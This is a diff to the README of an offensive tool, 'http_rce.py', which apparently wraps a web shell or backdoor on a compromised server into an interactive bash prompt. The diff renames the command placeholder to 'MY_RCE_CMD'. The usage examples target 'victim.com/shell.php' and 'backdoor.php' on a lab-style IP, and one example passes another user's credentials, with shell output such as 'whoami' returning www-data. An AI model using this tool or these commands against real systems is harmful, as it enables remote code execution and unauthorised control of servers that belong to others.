@@ -17,13 +17,13 @@ $ python3 ./http_rce.py --url 'http://victim.com/shell.php?cmd=MY_RCE_CMD&foo=ba
 $ python3 ./http_rce.py --url 'http://victim.com/shell.php?foo=bar' --http-method POST --data '{"cmd": "MY_RCE_CMD", "admin": "true"}' --username '<USER>' --password '<PASS>'
 ```
 
-The command's placeholder in the URL MUST be `MY_RCE_CMD`.
+The RCE's placeholder in the request MUST be `MY_RCE_CMD`.
 
 ## Examples
 
 Running as default user (e.g. `www-data`):
 ```bash
-$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?c=MY_CMD' --http-method GET
+$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?c=MY_RCE_CMD' --http-method GET
 bash > whoami
 www-data
 
@@ -38,7 +38,7 @@ bash >
 
 Running as another user (e.g. `foo`):
 ```bash
-$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?cmd=MY_CMD&foo1=bar2' --http-method GET --username 'foo' --password 'bar123'
+$ python3 ./http_rce.py --url 'http://10.10.10.123/backdoor.php?cmd=MY_RCE_CMD&foo1=bar2' --http-method GET --username 'foo' --password 'bar123'
 bash > whoami
 foo
 
